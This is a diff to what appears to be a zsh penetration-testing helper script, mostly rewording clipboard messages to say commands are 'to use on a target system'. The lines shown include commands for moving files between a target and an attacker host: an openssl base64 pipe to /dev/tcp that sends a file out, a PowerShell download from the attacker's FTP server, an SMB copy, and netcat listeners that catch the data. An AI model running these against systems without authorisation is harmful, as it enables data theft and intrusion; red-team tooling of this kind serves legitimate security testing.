@@ -138,7 +138,7 @@ nb-srv-uploadserver-upload() {
   echo "$__COMMAND2" | wl-copy
   echo "$__COMMAND1" | wl-copy
 
-  __info "2 Commands copied to clipboard"
+  __info "2 Commands to use on a target system copied to clipboard"
 }
 
 nb-srv-ftp() {
@@ -154,7 +154,7 @@ nb-srv-ftp-down() {
   __COMMAND="(New-Object Net.WebClient).DownloadFile('ftp://${__LHOST}/$filename', 'C:\Users\Public\\$filename')"
   echo "$__COMMAND" | wl-copy
 
-  __info "Command copied to clipboard"
+  __info "Command to use on a target system copied to clipboard"
 }
 
 nb-srv-smb() {
@@ -170,7 +170,7 @@ nb-srv-smb-down() {
   __COMMAND="copy \\${__LHOST}\share\\$filename"
   echo "$__COMMAND" | wl-copy
 
-  __info "Command copied to clipboard"
+  __info "Command to use on a target system copied to clipboard"
 }
 
 # New versions of Windows block unauthenticated guest access, to bypass set username and pass
@@ -189,7 +189,7 @@ nb-srv-smb-auth-down() {
   echo "$__COMMAND2" | wl-copy
   echo "$__COMMAND1" | wl-copy
 
-  __info "2 Commands copied to clipboard"
+  __info "2 Commands to use on a target system copied to clipboard"
 }
 
 nb-srv-ngrok() {
@@ -267,8 +267,10 @@ nb-srv-nc-file() {
 nb-srv-nc-b64() {
     nb-vars-set-lhost
     nb-vars-set-lport
-    __cyan "Use the command below on the target system: "
-    echo "openssl base64 -in FILE > /dev/tcp/${__LHOST}/${__LPORT}"
+    __COMMAND="openssl base64 -in FILE > /dev/tcp/${__LHOST}/${__LPORT}"
+    echo "$__COMMAND" | wl-copy
+    __info "Command to use on a target system copied to clipboard"
+
     print -z "nc -nvlp ${__LPORT} -w 5 > incoming.b64 && openssl base64 -d -in incoming.b64 -out incoming.txt"  
 }
 
@@ -283,7 +285,7 @@ nb-srv-nc-b64-web() {
     echo "$__COMMAND2" | wl-copy
     echo "$__COMMAND1" | wl-copy
 
-    __info "2 Commands copied to clipboard"
+    __info "2 Commands to use on a target system copied to clipboard"
 
     # Run the netcat listener
     print -z "nc -lvnp ${__LPORT} -w 5 > incoming.b64 && echo '$(cat incoming.b64)' | base64 -d -w 0 > decoded.txt"
